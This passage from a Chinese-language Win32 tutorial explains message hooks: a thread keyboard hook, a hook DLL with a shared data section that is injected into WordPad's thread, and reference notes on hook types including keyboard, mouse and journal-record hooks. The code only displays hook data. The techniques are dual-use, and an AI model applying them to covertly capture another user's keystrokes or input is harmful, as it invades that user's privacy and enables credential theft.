&quot; MSG:&quot; &lt;&lt; nCode &lt;&lt; std::hex &lt;&lt; &quot; wp:0x&quot; &lt;&lt; wp &lt;&lt; &quot; lp:0x&quot; &lt;&lt; lp &lt;&lt; &quot;\\n&quot;;ss.getline( text, MAXBYTE);SetWindowText( hWin, text );return CallNextHookEx( MyHook, nCode, wp, lp);&#125;HHOOK HookStart(int idHook, HINSTANCE hd, DWORD td)&#123;HOOKPROC hkp = reinterpret_cast( FilterFunc );HHOOK hk = SetWindowsHookEx( idHook, hkp, hd, td );if(hk==NULL)&#123;UINT Error = GetLastError(); ShowErrorInfo(Error);&#125;return hk;&#125;void HookDown(HHOOK hook)&#123; UnhookWindowsHookEx(hook);&#125;LRESULT CALLBACK circle( HWND hWin, UINT iMsg, WPARAM wp, LPARAM lp )&#123;HDC hdc ;PAINTSTRUCT ps ;RECTrect ;switch( iMsg )&#123;case WM_CREATE:PlaySound( szSound, NULL, SND_FILENAME | SND_ASYNC );MyHook = HookStart( WH_KEYBOARD, NULL,GetCurrentThreadId() );return 0;case WM_DESTROY:PostQuitMessage(0);HookDown( MyHook );return 0;case WM_PAINT:hdc = BeginPaint( hWin, &amp;ps);GetClientRect( hWin, &amp;rect );string text = &quot;Appication API HOOK&quot;;DrawText( hdc, text.c_str(), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER );EndPaint( hWin, &amp;ps);return 0;&#125;return DefWindowProc( hWin, iMsg, wp, lp);&#125; 当按下键盘时，标题就会显示WPARAM和LPARAM参数，注意窗口过程中没有对按键消息进行处理，这是在钩子过程FilterFunc中处理的，如下图： 下一步将要实现系统级别的钩子，这个程序将需要获取其它进程的线程ID以将DLL钩子注入线程，这里要先热身，介绍几个相关方法的原型： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104HWND SetCapture( HWND hWnd ); // 捕捉鼠标事件BOOL ReleaseCapture(VOID); // 释放鼠标HWND WindowFromPoint( POINT Point ); // 通过鼠标位置来获取窗口句柄HWND FindWindow( // 通过窗口类查找窗体 LPCTSTR lpClassName, // 窗口类名，NULL结束字符串 LPCTSTR lpWindowName // 窗口标题过滤); // 例如记事本Notepad、写字板WordPadClass、控制台ConsoleWindowClassHWND FindWindowEx( // 升级版FindWindow HWND hwndParent, // handle to parent window HWND hwndChildAfter, // handle to child window LPCTSTR lpszClass,// class name LPCTSTR lpszWindow// window name);BOOL EnumWindows( // 通过枚举查找窗口，回调函数原型随后 WNDENUMPROC lpEnumFunc, // callback function LPARAM lParam// application-defined value);BOOL EnumChildWindows( HWND hWndParent, // handle to parent window WNDENUMPROC lpEnumFunc, // pointer to callback function LPARAM lParam// application-defined value);BOOL CALLBACK EnumWindowsProc( // 返回False主动停止窗口枚举 HWND hwnd, // handle to parent window LPARAM lParam // application-defined value);DWORD GetWindowThreadProcessId( // 通过窗口句柄来获取线程ID HWND hWnd, // handle to window LPDWORD lpdwProcessId // process identifier);HANDLE GetCurrentProcess(VOID) // 一组获取当前进程、线程及基ID的APIDWORD GetCurrentProcessId(VOID)DWORD GetCurrentThreadId(VOID)HANDLE GetCurrentThread(VOID)int GetClassName( // 获取窗口类名 HWND hWnd, // handle to window LPTSTR lpClassName, // class name int nMaxCount// size of class name buffer);HANDLE OpenProcess( // 通过线程ID获取线程句柄 DWORD dwDesiredAccess, // 访问许可标志，见随后常数定义 BOOL bInheritHandle,// handle inheritance option DWORD dwProcessId // process identifier);#define PROCESS_TERMINATE (0x0001)// 允许终止进程。#define PROCESS_CREATE_THREAD (0x0002) // 允许创建远程线程。#define PROCESS_VM_OPERATION (0x0008) // 许可WriteProcessMemory、VirtualProtectEx修改地址空间。#define PROCESS_VM_READ (0x0010)// 允许对进程的地址空间进行读操作。#define PROCESS_VM_WRITE (0x0020)// 允许对进程的地址空间进行写操作。#define PROCESS_DUP_HANDLE(0x0040) // 允许进程句柄被复制。#define PROCESS_CREATE_PROCESS(0x0080) //#define PROCESS_SET_QUOTA (0x0100)//#define PROCESS_SET_INFORMATION (0x0200) // 许可SetPriorityClass函数设置进程的优先级。#define PROCESS_QUERY_INFORMATION (0x0400) //许可GetExitCodeProcess查询进程的退出码// 或使用GetPriorityClass函数查询进程的优先级。#define PROCESS_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | SYNCHRONIZE | 0xFFF)FARPROC GetProcAddress( // 获取指定模块的函数地址 HMODULE hModule,// handle to DLL module LPCSTR lpProcName // name of function);HINSTANCE LoadLibrary( // 手动装载程序模块 LPCTSTR lpLibFileName // address of filename of executable module);HINSTANCE LoadLibraryEx( LPCTSTR lpLibFileName, // points to name of executable module HANDLE hFile, // reserved, must be NULL DWORD dwFlags // 入口点处理标志，见随后的常数定义);#define DONT_RESOLVE_DLL_REFERENCES 0x00000001#define LOAD_LIBRARY_AS_DATAFILE0x00000002 // 不执行入口，相当LoadResource#define LOAD_WITH_ALTERED_SEARCH_PATH 0x00000008DWORD GetModuleFileName( // 获取模块文件位置 HMODULE hModule,// handle to module to find filename for LPTSTR lpFilename, // pointer to buffer to receive module path DWORD nSize // size of buffer, in characters);UINT_PTR SetTimer( // 设置定时器 HWND hWnd, // handle to window UINT_PTR nIDEvent, // your timer identifier UINT uElapse, // time-out value in milliseconds TIMERPROC lpTimerFunc // timer procedure);BOOL KillTimer( HWND hWnd, // handle to window UINT_PTR uIDEvent // timer identifier);VOID CALLBACK TimerProc( HWND hwnd, // handle to window UINT uMsg, // WM_TIMER message UINT_PTR idEvent, // timer identifier DWORD dwTime // current system time); 先来热身一下，这是一个通过枚举查找窗口类，标题、句柄等信息的控制台程序： 12345678910111213141516171819202122232425262728293031#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;BOOL CALLBACK EnumProc( HWND hwnd, LPARAM lParam )&#123;char buf[MAXWORD];char bufClass[MAXWORD];DWORD thread;GetWindowTextA( hwnd, buf, MAXWORD );GetClassNameA( hwnd, bufClass, MAXWORD );thread = GetWindowThreadProcessId( hwnd, NULL );string title(buf);if(title==string(&quot;Default IME&quot;) ||title==string(&quot;Default IME&quot;) ||title==string(&quot;MSCTFIME UI&quot;)) return true;cout &lt;&lt; &quot;Found:0x&quot; &lt;&lt; hwnd &lt;&lt; &quot; THREAD:0x&quot; &lt;&lt; thread &lt;&lt; &quot; CLASS:&quot; &lt;&lt; bufClass &lt;&lt; &quot; TITLE:&quot; &lt;&lt; buf &lt;&lt; endl;return true;&#125;void main()&#123;int (WINAPI *cb)() = reinterpret_cast(EnumProc);BOOL isok = EnumWindows( cb, NULL);cout &lt;&lt; &quot;exit:&quot; &lt;&lt; isok &lt;&lt; endl;&#125; 这一个程序可以通过ShowWindow来让程序在任务栏显示或隐藏。 123456789101112131415161718192021222324252627#include &lt;windows.h&gt;#include &lt;iostream&gt;#include &lt;string&gt;using namespace std;BOOL Toggle(const char *name, int state=SW_SHOW)&#123;HWND hwin = FindWindowA( name, NULL );return ShowWindow( hwin, state );&#125;void main()&#123;cout &lt;&lt; &quot;Type exit to close.&quot; &lt;&lt; endl;for(;;)&#123;string s;cin &gt;&gt; s;if(s==&quot;show&quot;)&#123;string name;cin &gt;&gt; name;if( name.length()&gt;0 ) Toggle( name.c_str(), SW_SHOW );&#125;else if( s==&quot;hide&quot;)&#123;string name;cin &gt;&gt; name;if( name.length()&gt;0 ) Toggle( name.c_str(), SW_HIDE );&#125;else if( s==&quot;exit&quot;) break;&#125;&#125; 系统钩子 接下来开始正题，这次要建立系统级别的钩子。接下来需要深入一层使用系统钩子，这样就要新建一个DLL工程了，命名为hooksrv，这样工程就会生成hooksrv.dll。现在就来定义hooksrv.h头文件，注意前面的代码文件中HookStart和HookDown两个方法是要导出供程序调用的，这也是DLL程序的基本要求，那么导出标记EXPORT就在下面这个头文件中按格式定义。导出标记可以有三种方式，源代码中的 __declspec(dllexport) 关键字，.def 文件中的 EXPORTS 语句，LINK 命令中的 /EXPORT 规范。注意，使用 .def 文件从 DLL 中导出变量时，不需要在变量上指定导出标记。但是，在使用 DLL 的代码上，仍必须使用函数的导出声明，这个声明通常伴随在DLL的头文件内。头文件同时定义了一个WM_HOOK消息，这个消息将在消息环中使用。因为这是个自定义消息，所以只能使用Windows要求的比WM_USER大的值，比WM_USER小的消息值只供系统专用。 1234567891011/*********** hooksrv.h **********/#include &lt;windows.h&gt;#define EXPORT __declspec(dllexport)// #define IMPORT extern _declspec(dllimport)// IMPORT int hookCode; // 此两行用于程序导入DLL变量EXPORT HHOOK HookStart( int hookID, HWND hWindow, DWORD dwThreadId );EXPORT BOOL HookDown( HHOOK );#define WM_HOOK WM_USER + 1 这里使用了Visual Studio 97，编译输出是x86架构的，如果要使用x64平台，请使用Visual Studio 2005的x64编译器。接下来要设置一下工程属性。在Post-build step新建一个命令动作，在DLL完成编译时用来将DLL拷贝到程序目录。假设我们的主程序在hookcross目录下，并且和hooksrv工作目录同级，那么对于DEBUG版本就可以使用以下命令，这样编译DLL时，就会自动拷贝到程序的工作目录下了： 1copy debug\\hooksrv.dll ..\\hookcross\\debug\\ 再来实现钩子的基本功能代码部分hooksrv.cpp，其中HookShared是一个共享段，RWS标记它是Read、Write和Shared的共享段，它是可选部分，这时用来展示如果实现DLL共享数据段。这样DLL注入到不同的程序后，可以透过共享段来进行数据共享。否则，在Win32受保护的程序内存空间下，程序间是不可以相互直接获取数据的。当然可以变通地使用传输只读数据的WM_COPYDATA消息，网络传输，或用CreateFileMapping内存映射文件实现共享内存，进程内存读写ReadProcessMemory及WriteProcessMemory，又或者使用剪切板SetClipboardData等手段。DLL共享数据时，一定要使用静态始化，否则编译时会因被放到未初始化数据段而失效，初始化为0的值也会当作未初始化数据而存放于.bss段中。另外，DLL 本身有可能加载到每个进程的虚拟地址空间中的不同地址。因此具有指向 DLL 中的函数或指向其他共享变量的指针是不安全的。注意永远不要将特定于进程的信息存储在共享数据段中，这里只是展示如何使用DLL共享数据，在逻辑上来讲这样共享hookCode做是不正确的，因为它是属于被注入钩子的进程的。而前导的EXPORT是导出标记，定义在头文件中，导出DLL变量是为了方便在程序中访问，这些导出也可以通过模块定义文件DEF来标记。特别说明一下，导出变量和共享变量是两个概念，共享变量是所有进程加载DLL时，共享变量只有一个副本，任何修改都会在其它进程上反映。 1234567891011121314151617181920212223242526272829303132333435363738#include &quot;hooksrv.h&quot;#pragma data_seg(&quot;HookShared&quot;)HHOOK hHook = NULL;HWND hWnd = NULL;EXPORT int hookCode = 0xff;#pragma data_seg()#pragma comment(linker, &quot;/SECTION:HookShared,RWS&quot;)HINSTANCE hMod;EXPORT BOOL APIENTRY DllMain( HANDLE hModule, DWORD fdwreason, LPVOID lpReserved )&#123;hMod = (HINSTANCE)hModule;return TRUE;&#125;void ShowErrorInfo(int Error)&#123; &#125; // 函数体在前面已经给出，这里省略。LRESULT WINAPI HookProc(int code, WPARAM wParam, LPARAM lParam)&#123;hookCode = code;SendMessage( hWnd, WM_HOOK, wParam, lParam );return CallNextHookEx(hHook, code, wParam, lParam);&#125;EXPORT HHOOK HookStart(int hookID, HWND hWindow, DWORD dwThreadId)&#123;hWnd = hWindow;HOOKPROC cb = reinterpret_cast( HookProc ); // for VS97hHook = SetWindowsHookEx( hookID, cb, hMod, dwThreadId);if( !hHook ) ShowErrorInfo( GetLastError() );return hHook;&#125;EXPORT BOOL HookDown(HHOOK idHook)&#123;hWnd = NULL;return UnhookWindowsHookEx(hHook);&#125; 对于DLL的入口DLLMain，这是自定义的入口点。如果没有指定它，系统会使用内置的入口点_DllMainCRTStartup，它会调用一个例程来初始化 C/C++ 的运行库，这个例程就是_CRT_INIT。事实上，DLLMain也应该完成这些初始化的功能。入口参数hModule指载入DLL的进行句柄，参数fdwreason表示了载入DLL的进程是以什么方式进行的，如下： 1234#define DLL_PROCESS_ATTACH 1 // 正在映射到进程地址空间，执行初始化，出错则返回FALSE#define DLL_THREAD_ATTACH 2 // 线程已经创建，执行初始化#define DLL_THREAD_DETACH 3 // 线程终止，执行清理。测试时并没有执行！#define DLL_PROCESS_DETACH 0 // 进程终止，从映射空间撤除，执行必要的清理 对于主程序，还是拿最开始的样板来使用，只需要修改一部分就可以了。新建一具hookcross工程，添加一个代码文件，文章开始将样板代码拷贝过来，修改窗口过程，并添加一个时钟调用。这样程序执行时会定时检查系统，看看有没有写字板程序在运行，如果发现它就将钩子注入。hooksrv.dll在程序执行时将由系统自动调入，手动装入DLL可以参考MSDN的Platform SDK &gt; Windows Base Services &gt; Excutables部分。注意，注册钩子时，使用了DLL的进程ID，而且使用了其它线程，这里指写字板线程，所以注册的是一个线程的系统钩子，而且只对Wordpad的消息环进行监测。如果，线程ID设置为NULL，那么，这个钩子将对所有进程的消息进行监测，这就成了一个全局系统钩子。主程序不用修改，主要是修改窗口过程部分，这里将修改及添加部分的代码罗列出来： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &quot;../HookSrv/hooksrv.h&quot;#pragma comment(lib,&quot;../HookSrv/Debug/hooksrv.lib&quot;)extern __declspec(dllimport) int hookCode;UINT COUNT;HHOOK MyHook;UINT TIMER_HOOK = 1;string tipText = &quot;Appication API HOOK Wating for a Wordpad.&quot;;void CALLBACK TimerProc(HWND hwin, UINT uMsg, UINT id, DWORD t)&#123;HWND hw = FindWindow( &quot;WordPadClass&quot;,NULL );if(!hw) return;DWORD thread = GetWindowThreadProcessId( hw, NULL );MyHook = HookStart( WH_SHELL, hWin, thread );if(MyHook)&#123;KillTimer( hWin,TIMER_HOOK );tipText = &quot;Hooked for Wordpad.&quot;;RECT rect;GetClientRect( hWin, &amp;rect );InvalidateRect( hWin, &amp;rect, TRUE);UpdateWindow( hWin );&#125;&#125;void SendToPad(char * buf)&#123; // 通过消息给程序发送字符及换行符string txt(buf);HWND hw = FindWindow( &quot;WordPadClass&quot;,NULL );HWND hc = FindWindowEx( hw, NULL,&quot;RICHEDIT50W&quot;,NULL );if(!hc) return;for( int i=0; i&lt;txt.length(); i++)&#123;SendMessage( hc, WM_CHAR, (char) txt[i], 0 );&#125;SendMessage( hc, WM_KEYDOWN, VK_RETURN, 0 ); // &quot;\\r\\n&quot; for Wordpad;&#125;LRESULT CALLBACK circle( HWND hWin, UINT iMsg, WPARAM wp, LPARAM lp )&#123;HDC hdc ;PAINTSTRUCT ps ;RECT rect ;string text = &quot;Appication API HOOK Wating for a Wordpad.&quot;;char buf[MAXBYTE];stringstream ss;TIMERPROC cb = reinterpret_cast(TimerProc); // for VS97switch( iMsg )&#123;case WM_CREATE:PlaySound( szSound, NULL, SND_FILENAME | SND_ASYNC );SetTimer( hWin, TIMER_HOOK, 1000, cb);return 0;case WM_DESTROY:PostQuitMessage(0);HookDown( MyHook );return 0;case WM_PAINT:hdc = BeginPaint( hWin, &amp;ps);GetClientRect( hWin, &amp;rect );DrawText( hdc, tipText.c_str(), -1, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER );EndPaint( hWin, &amp;ps);return 0;case WM_HOOK:ss &lt;&lt; szTitle &lt;&lt; &quot; - &quot; &lt;&lt; ++COUNT &lt;&lt; std::hex &lt;&lt; &quot; HOOK:0x&quot; &lt;&lt; hookCode &lt;&lt; &quot; wp:0x&quot; &lt;&lt; wp &lt;&lt; &quot; lp:0x&quot; &lt;&lt; lp &lt;&lt; &quot;\\n&quot;;ss.getline( buf, MAXBYTE);SetWindowText( hWin, buf );SendToPad(buf);&#125;return DefWindowProc( hWin, iMsg, wp, lp);&#125; 注意主程序使用__declspec(dllimport)标记来导入DLL变量，hookCode这个变量存储在DLL的共享数据段，所有使用此DLL的进程都可以修改它，并且所有进程都会得到修改后的数据，这种情况就是进程不安全的状态。 如果钩子不是DLL模块，那么在设置系统钩子时，就会出错：没有模块句柄无法设置非本机连接。这里尝试将钩子也编译到同一个程序文件来测试，通过LocaLibrary来加载程序，通过返回的模块句柄来操作，但LoadLibrary不能使其形成有效的模块，即使程序正常运行，但即收不到钩子回调动作。同时，每一个DLL钩子同时只能有个程序使用，如果多个程序使用注册DLL钩子，那么最后注册的才有效，即设置了不同的钩子类型，但是清除钩子却可以由不同的程序完成！钩子回调过程细节 钩子回调时，传回三个参数中，第一个为ncode，它指一个钩子的代码，如果这个为负值，那么应该直接通过CallNextHookEx传回系统内部处理，然后回调函数直接返回系统给出的结果。但是从Windows 3.1开始，不再向回调函数传递负值了。后两个wParam和lParam，与消息环的参数可以说十分一致。它们则是根据不同的钩子，用来传递不同的参数或数据。下面逐个钩子类型进行解释。这里特别要说明一点，因为Windows进程的内存空间是受保护的，所以注入DLL的进程和主程序是两个受保护的内存空间，要共享数据就要透过前面介绍的DLL共享数据的方法，或其它手段的实现，绝对不能通过指针来实现。 WH_CALLWNDPROC 得到一个钩子代码指示SendMessage已经发送消息，和一个指针指向真正的消息数据，如下： 123456typedef struct tagCWPSTRUCT &#123;LPARAM lParam;WPARAM wParam;DWORD message;HWND hwnd;&#125; CWPSTRUCT, *PCWPSTRUCT, NEAR *NPCWPSTRUCT, FAR *LPCWPSTRUCT; WH_DEBUG 当系统调用其它类型钩子过程之前会执行这个钩子，wParam中得到下一个将被调用的钩子的ID，例如可能是一个WH_MOUSE。可以通过返回一个非0值来阻止系统，但不能修改钩子ID。lParam指向一个结构体，定义如下： 12345678typedef struct tagDEBUGHOOKINFO&#123;DWORD idThread; // The thread ID for the current threadLPARAM reserved;LPARAM lParam;// The lParam for the target filter functionWPARAM wParam;// The wParam for the target filter functionint code;&#125; DEBUGHOOKINFO, *PDEBUGHOOKINFO, NEAR *NPDEBUGHOOKINFO, FAR* LPDEBUGHOOKINFO; WH_FOREGROUNDIDLE 当用户进程空闲无用户输入时调用的钩子，注意，只有钩子注入的线程是当前线程时才有效。这只是一个通知钩子，可以用来执行空闲任务，参数 wParam 和 lParam 都是0。 WH_GETMESSAGE 在GetMessage和PeekMessage即将返回时消息时调用的钩子，lParam指向一个结构体，包含了消息体数据，对消息的所有修改也会原样返回给程序。 12345678typedef struct tagMSG &#123; /* msg */HWND hwnd; // The window whose Winproc will receive the messageUINT message; // The message numberWPARAM wParam;LPARAM lParam;DWORD time; // The time the message was postedPOINT pt;//The cursor position in screen coordinates of the message&#125; MSG; WH_HARDWARE 欠缺资料。 WH_KEYBOARD 当GetMessage或PeekMessage即将返回键盘消息时调用，即一系列的WM_KEYUP, WM_KEYDOWN, WM_SYSKEYUP, WM_SYSKEYDOWN, 和 。回调过程会收到键盘的虚拟按键代码和键盘状态，还可以让系统忽略掉这些消息。回调过程的钩子代码有两种，HC_ACTION和HC_NOREMOVE。前者表示事件将要从系统队列中清除，而后者则提示消息队列不会移除键盘消息。这是因为程序使用了带PM_NOREMOVE参数的PeekMessage。wParam存放虚拟键值如VK_ESCAPE之类，或在WM_CHAR消息中存放字符代码，lParam存放按键数据，如重复次数，按键扫描码之类。虚拟键值定义在WINRESRC.H，现罗列如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#define VK_LBUTTON0x01#define VK_RBUTTON0x02#define VK_CANCEL 0x03#define VK_MBUTTON0x04/* NOT contiguous with L &amp; RBUTTON */#define VK_BACK 0x08 #define VK_SPACE 0x20#define VK_TAB0x09 #define VK_PRIOR 0x21#define VK_NEXT 0x22#define VK_CLEAR 0x0C #define VK_END0x23#define VK_RETURN 0x0D #define VK_HOME 0x24#define VK_LEFT 0x25#define VK_SHIFT 0x10 #define VK_UP 0x26#define VK_CONTROL0x11 #define VK_RIGHT 0x27#define VK_MENU 0x12 #define VK_DOWN 0x28#define VK_PAUSE 0x13 #define VK_SELECT 0x29#define VK_CAPITAL0x14 #define VK_PRINT 0x2A#define VK_EXECUTE0x2B#define VK_SNAPSHOT 0x2C#define VK_ESCAPE 0x1B #define VK_INSERT 0x2D#define VK_DELETE 0x2E#define VK_HELP 0x2F/* VK_0 thru VK_9 are the same as ASCII &#x27;0&#x27; thru &#x27;9&#x27; (0x30 - 0x39) *//* VK_A thru VK_Z are the same as ASCII &#x27;A&#x27; thru &#x27;Z&#x27; (0x41 - 0x5A) */#define VK_LWIN 0x5B#define VK_RWIN 0x5C#define VK_APPS 0x5D #define VK_SEPARATOR 0x6C#define VK_SUBTRACT 0x6D#define VK_NUMLOCK0x90 #define VK_DECIMAL0x6E#define VK_SCROLL 0x91 #define VK_DIVIDE 0x6F#define VK_NUMPAD00x60 #define VK_F1 0x70#define VK_NUMPAD10x61 #define VK_F2 0x71#define VK_NUMPAD20x62 #define VK_F3 0x72#define VK_NUMPAD30x63 #define VK_F4 0x73#define VK_NUMPAD40x64 #define VK_F5 0x74#define VK_NUMPAD50x65 #define VK_F6 0x75#define VK_NUMPAD60x66 #define VK_F7 0x76#define VK_NUMPAD70x67 #define VK_F8 0x77#define VK_NUMPAD80x68 #define VK_F9 0x78#define VK_NUMPAD90x69 #define VK_F100x79#define VK_MULTIPLY 0x6A #define VK_F110x7A#define VK_ADD0x6B #define VK_F120x7B/* * VK_L* &amp; VK_R* - left and right Alt, Ctrl and Shift virtual keys. * Used only as parameters to GetAsyncKeyState() and GetKeyState(). * No other API or message will distinguish left and right keys in this way. */#define VK_LSHIFT 0xA0#define VK_RSHIFT 0xA1#define VK_LCONTROL 0xA2#define VK_RCONTROL 0xA3#define VK_LMENU 0xA4#define VK_RMENU 0xA5 WH_MOUSE 当GetMessage或PeekMessage即将返回鼠标消息时调用，和WH_KEYBOARD相似，也有钩子代码指示消息是否会从队列中移除。而鼠标事件消息有好多，如WM_MOUSEMOVE，也有直接根据鼠标按键状态引发的事件消息，如WM_LBUTTONDOWN、WM_LBUTTONUP、WM_LBUTTONDBLCLK，还有相应的中键和右键的消息。lParam的高低两个字节分别存储了Y、X坐标，即LOWORD(lParam)表示X坐标。wParam存储了按键状态数据，可以和按键掩码进行运算，如MK_CONTROL、MK_LBUTTON、MK_MBUTTON、MK_RBUTTON、MK_SHIFT。 当鼠标在非显示区域时，会引发WM_NCMOUSEMOVE这类事件，有对应按下左键的WM_NCLBUTTONDOWN、WM_NCLBUTTONUP、WM_NCLBUTTONDBLCLK，其它按键类似。此时wParam表示命中的区域，lParam还是表示鼠标的屏幕坐标系。 鼠标命中测试消息WM_NCHITTEST，Windows根据它来产生与鼠标位置相关的所有其它鼠标消息。wParam未使用，lParam 存储屏幕坐标。滑轮消息WM_MOUSEWHEEL，此时wParam还保存按键状态数据，而且在其高两字节保存了滚动计数值zDelta，即HIWORD(wParam)。 但是在鼠标钩子回调过程中，wParam存放的是鼠标消息ID，lParam指向一个结构体，如下罗列： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#define WM_MOUSEACTIVATE0x0021#define WM_NCMOUSEMOVE 0x00A0#define WM_NCMOUSEMOVE 0x00A0#define WM_NCLBUTTONDOWN0x00A1#define WM_NCLBUTTONUP 0x00A2#define WM_NCLBUTTONDBLCLK 0x00A3#define WM_NCRBUTTONDOWN0x00A4#define WM_NCRBUTTONUP 0x00A5#define WM_NCRBUTTONDBLCLK 0x00A6#define WM_NCMBUTTONDOWN0x00A7#define WM_NCMBUTTONUP 0x00A8#define WM_NCMBUTTONDBLCLK 0x00A9#define WM_MOUSEFIRST 0x0200#define WM_MOUSEMOVE0x0200#define WM_LBUTTONDOWN 0x0201#define WM_LBUTTONUP0x0202#define WM_LBUTTONDBLCLK0x0203#define WM_RBUTTONDOWN 0x0204#define WM_RBUTTONUP0x0205#define WM_RBUTTONDBLCLK0x0206#define WM_MBUTTONDOWN 0x0207#define WM_MBUTTONUP0x0208#define WM_MBUTTONDBLCLK0x0209#if(_WIN32_WINNT &gt;= 0x0400)#define WM_MOUSEWHEEL 0x020A#endif /* _WIN32_WINNT &gt;= 0x0400 */#if (_WIN32_WINNT &lt; 0x0400)#define WM_MOUSELAST0x0209#else#define WM_MOUSELAST0x020A#endif /* if (_WIN32_WINNT &lt; 0x0400) */#if(_WIN32_WINNT &gt;= 0x0400)#define WM_MOUSEHOVER 0x02A1#define WM_MOUSELEAVE 0x02A3#endif /* _WIN32_WINNT &gt;= 0x0400 */typedef struct tagMOUSEHOOKSTRUCT &#123;POINT pt;HWND hwnd;UINT wHitTestCode;DWORD dwExtraInfo;&#125; MOUSEHOOKSTRUCT, FAR *LPMOUSEHOOKSTRUCT, *PMOUSEHOOKSTRUCT;typedef struct tagPOINT &#123;LONG x;LONG y;&#125; POINT; WH_MSGFILTER 这个钩子在对话框、消息框、滚动条、菜单条收到消息时，或ALT+TAB、ALT+ESC等组合键在钩子活动中被按下时调用，不过测试时发现组合键不会引用钩子调用。因为这个钩子是指定线程的，因此它可以在程序或DLL中运行良好。它的回调过程将会收到lParam指向的消息数据，还有以下几个钩子代码表示不同的状态，还有些未使用的就不罗列了： 123456#define MSGF_DIALOGBOX 0 // 消息框或对话框消息#define MSGF_MENU 2 // 菜单条消息#define MSGF_MOVE 3 // 移动窗口消息#define MSGF_SIZE 4 // 调整窗口大小#define MSGF_SCROLLBAR 5 // 滚动条消息#define MSGF_NEXTWINDOW 6 // 即将替换为下一个窗口 WH_SYSMSGFILTER 相似WH_MSGFILTER钩子，它要更早执行，因为是系统级别的。因此通过返回TRUE，可以忽略掉WH_MSGFILTER钩子。 WH_SHELL 外壳钩子发生在顶级窗口消息中，因此也是要指定线程ID的，钩子只在属于线程的窗口消息中引发。是一个通知钩子，因此不能更改事件消息，在wParam参数中包含了窗口的句柄。部分钩子代码有如下值定义： 123456789#define HSHELL_WINDOWCREATED1 // 窗口已经创建消息#define HSHELL_WINDOWDESTROYED 2 // 窗口即将解构#define HSHELL_ACTIVATESHELLWINDOW 3 // 激活shell主窗口#define HSHELL_WINDOWACTIVATED 4 // 窗口已切换#define HSHELL_GETMINRECT 5 // 系统需要该窗口被最小化时的矩形坐标#define HSHELL_REDRAW 6 // 任务条上的标题已被重画#define HSHELL_TASKMAN 7 // 用户已选择其任务列表#define HSHELL_LANGUAGE 8 // 键盘语言被改变或者一个新的键盘布局被加载#define HSHELL_ACCESSIBILITYSTATE 11 // NT5.0或以上版本有效，指示可访问性已改变 记录钩子 JOURNAL，是日志记录的意思，相关的钩子也是和记录和回放事件有关的，因为它是系统全局的钩子，影响所有程序，因而负作用更多。为此系统提供了几种默认的的按键来清除这些钩子，有CTRL+ESC、 ALT+ESC 和 CTRL+ALT+DEL。然后，系统通过一条WM_CANCELJOURNAL消息通知程序被挂了日志钩子。这个消息并没指定窗口句柄，因此没有窗口过程会收到这样的消息分配。一个好方法就是使用WH_GETMESSAGE钩子来截取这条消息。当然提供一个取消钩子的方法更重要，如通过VK_CANCEL 即CTRL+BREAK。下面是两个日志相关钩子。 WH_JOURNALRECORD 记录钩子，系统从队列中移除鼠标及键盘消息时引发，除了回放钩子的消息外。钩子可以处理，但不可以修改或丢弃消息，这是因为记录已经保存在磁盘或内存中。目前只实现HC_ACTION这个有效钩子代码。lParam参数指向一个ENVENTMSG结构体，通常的做法是将这些数据存储起来，然后再通过回放钩子将这些数据形成回放动作。注意它只能是全局的系统钩子。 12345678typedef struct tagEVENTMSG &#123;UINT message; // 消息ID，如WM_MOUSEMOVEUINT paramL;UINT paramH;DWORD time; // 消息发生的系统时间，GetTickCount的返回值HWND hwnd;&#125; EVENTMSG;typedef struct tagEVENTMSG *PEVENTMSG, NEAR *NPEVENTMSG, FAR *LPEVENTMSG; 如果是键盘消息，paramL高字节放有扫描码，低字节放有虚拟键值，paramH则包含重复次数、Bit 15指示扩展键是否等内容；如果是鼠标消息，paramL 和 paramH 则是xy坐标。 WH_JOURNALPLAYBACK 回放钩子在回放记录钩子的数据，或给其它程序发送事件消息时使用。当回放钩子一挂接，系统就会忽略鼠标的移动，其它的键盘和鼠标事件消息将会在回放钩子撤除后才会进入队列。钩子代码有以下两个： HC_GETNEXT，在访问线程消息时引发，系统会使用相同的消息调用多次。lParam指定一个EVENTMSG结构体，回调过程需要将已经记录的数据填回到这个结构体中，通常是直接拷贝已在记录钩子保存的数据。系统需要两个参数来处理钩子提供的回放数据，一个是等待处理这条消息的时间，另一个是在什么时候处理这条消息。通常等待时间可以使用两个相间的消息时间的差值，而指定处理时间则通过等待时间和当前GetTickCount返回值相加得到。如果想要加速回放，设置等待时间为0就可以了，等待时间通过钩子回调返回给系统。 HC_SKIP，当系统处理完一个回放记录时引发，此时应当准备下一个回放记录，当所胡记录都回放完了，就应该清除回放钩子，以使程序回到正常工作状态。 WH_CBT 这可以说是最最长篇的一个钩子，它有如下几种钩子代码： 12345678910# define HCBT_MOVESIZE 0#define HCBT_MINMAX 1#define HCBT_QS 2#define HCBT_CREATEWND 3#define HCBT_DESTROYWND 4#define HCBT_ACTIVATE 5#define HCBT_CLICKSKIPPED 6#define HCBT_KEYSKIPPED 7#define HCBT_SYSCOMMAND 8#define HCBT_SETFOCUS 9 HCBT_ACTIVATE，激活窗口，返回TRUE阻止焦点以禁止激活。对应的参数，wParam指向正在激活的窗口的句柄，lParam指向一个结构体： 12345typedef struct tagCBTACTIVATESTRUCT&#123; BOOL fMouse; // TRUE if activation results from a mouse click HWND hWndActive; // the currently active window&#x27;s handle.&#125; CBTACTIVATESTRUCT, *LPCBTACTIVATESTRUCT; HCBT_CREATEWND，窗口创建中，但程序的WM_GETMINMAXINFO, WM_NCCREATE, WM_CREATE消息还没有发出，因此返回TRUE可以禁止窗体的创建。参数wParam是窗口的句柄，lParam指向一个结构体： 12345678910111213141516171819struct CBT_CREATEWND&#123;struct tagCREATESTRUCT *lpcs;HWND hwndInsertAfter; // The window will be followed, in Z-order.&#125; CBT_CREATEWND, *LPCBT_CREATEWND;typedef struct tagCREATESTRUCTA &#123;LPVOID lpCreateParams;HINSTANCE hInstance;HMENU hMenu;HWND hwndParent;int cy;int cx;int y;int x;LONG 